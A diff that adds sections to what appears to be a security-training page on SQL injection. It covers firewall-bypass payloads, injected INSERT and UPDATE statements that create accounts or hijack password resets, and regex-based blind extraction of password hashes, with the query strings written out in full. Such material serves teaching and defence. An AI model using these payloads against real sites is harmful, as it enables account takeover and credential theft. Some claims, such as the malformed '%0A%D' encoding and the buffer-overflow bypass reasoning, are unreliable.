@@ -270,3 +270,53 @@ an SQL injection attack and bypass the firewall.</p>
 <p>An attacker can use the buffer overflow method to crash and bypass the firewall. As most firewalls are developed in C/C++, it is easy for the attacker to bypass the firewall.</p>
 <p><i>?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4</i></p>
 <p>If the hacker gets the 500 error message as the response, he/she can easily bypass the firewall using the buffer overflow method</p>
+
+<h2>CRLF Technique</h2>
+<p>Carriage return, line feed (CRLF) is a pair of ASCII codes, 13 and 10. In Windows, CRLF is used to indicate the end of a line in a text file (\r\n). Macintosh uses CR (\r) alone and UNIX uses LF(\n) alone. The 
+attacker can use the CRLF technique to bypass the firewall.</p>
+<p><i>http://www.certifiedhacker.com/info.php?id=1+%0A%Dunion%0A%0D+%0A%0Dselect%0A%0D+1,2,3,4,5--</i></p>
+
+<h2>Integration Method</h2>
+<p>The integration method involves using different bypassing techniques together to increase the chances of bypassing the firewall, where a single method or technology is not sufficient to do so.</p>
+<p><i>www.certifiedhacker.com/index.php?page_id=21+and(select 1)=(Select 0xAA[..(add about 1200 "A")..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4,5</i></p>
+
+<h1>Perform SQL Injection to Insert a New User and Update Password</h1>
+<h2>Inserting a New User using SQL Injection</h2>
+<p>If an attacker can learn about the structure of the users table in a database, he can attempt to insert new user details into that table. Once the attacker is successful in adding new user details, he 
+can directly use the new user credentials to logon to the web application.</p>
+<p>For example, an attacker can exploit the following query:<br/>
+<i>SELECT * FROM Users WHERE Email_ID = 'Alice@xyz.com'</i></p>
+<p>After injecting the INSERT statement into the above query:<br/>
+<i>SELECT * FROM Users WHERE Email_ID = 'Alice@xyz.com'; INSERT INTO Users (Email_ID,User_Name,Password) VALUES ('Clark@mymail.com','Clark','MyPassw');--';</i></p>
+<p>This attack is only possible if the victim has INSERT permission on the users table!</p>
+
+<h2>Updating Password using SQL injection</h2>
+<p>Many web applications use a login that requires a username and password to give users access to the services provided by the organization. Sometimes, users forget their passwords. To address this issue, 
+developers provide a <b>Forgot Password</b> feature, which delivers a forgotten password or a new password to the user's registered email address. An attacker may exploit this feature by attempting to embed 
+malicious SQL-specific inputs that may update a user's email address with the attacker's email address. If this succeeds, the forgotten or new password will be sent to the attacker's email address. The 
+attacker uses the UPDATE SQL command to overwrite the user's email address in the application database. For example, if an attacker is able to learn that a user with an email address 'Alice@xyz.com' exists, 
+he can UPDATE the email address to the attacker's address. An attacker injects the UPDATE statement into the following query:</p>
+<p><i>SELECT * FROM Users WHERE Email_ID = 'Alice@xyz.com'</i></p>
+<p><i>SELECT * FROM Users WHERE Email_ID = 'Alice@xyz.com'; UPDATE Users SET Email_ID = 'Clark@mymail.com' WHERE Email_ID = 'Alice@xyz.com'</i></p>
+
+<h1>Exporting a Value with Regular Expression Attack</h1>
+<p>An attacker performs SQL injection using regular expressions on a known table to learn the values of confidential information such as passwords. For example, if an attacker knows that a web application 
+stores its user details in a table named <b>UserInfo</b> the attacker can perform a regular expression attack to determine the passwords. In general, databases store hashed passwords generated from MD5 or 
+SHA-1 algorithms [a-f0-9]</p>
+<h2>Exporting a value in MySQL</h2>
+<p>In MySQL, an attacker uses the following method to identify the first character of the passwords. Check if the 1st character in the password is between "a" and "f":<br/>
+<i>index.php?id=2 and 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^[a-f]' AND ID=2)</i></p>
+<p>If the above query returns TRUE, then check if the 1st character in the password is between "a" and "c":<br/>
+<i>index.php?id=2 and 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^[a-c]' AND ID=2)</i></p>
+<p>If the query returns FALSE, the attacker infers that the first character is between "d" and "f":<br/>
+<i>index.php?id=2 and 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^[d-f]' AND ID=2)</i></p>
+<p>If the result of the query is TRUE, check if the 1st character in password is between "d" and "e"<br/>
+<i>index.php?id=2 and 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^[d-e]' AND ID=2)</i></p>
+<p>If the result of the query is TRUE, the attacker tests for "d" or "e":<br/>
+<i>index.php?id=2 and 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^[d]' AND ID=2)</i></p>
+
+<h2>Exporting a value in MSSQL</h2>
+<p>In MSSQL, attackers use the same method as above</p>
+<p>Check if the 2nd character in the password is between "a" and "f"<br/>
+<i>default.aspx?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password LIKE 'd[a-f]%' AND ID=2)</i></p>
+<p>The attacker repeats the process to identify all remaining characters of the password. Once obtained, he logs on to the web application to perform various malicious activities.</p>
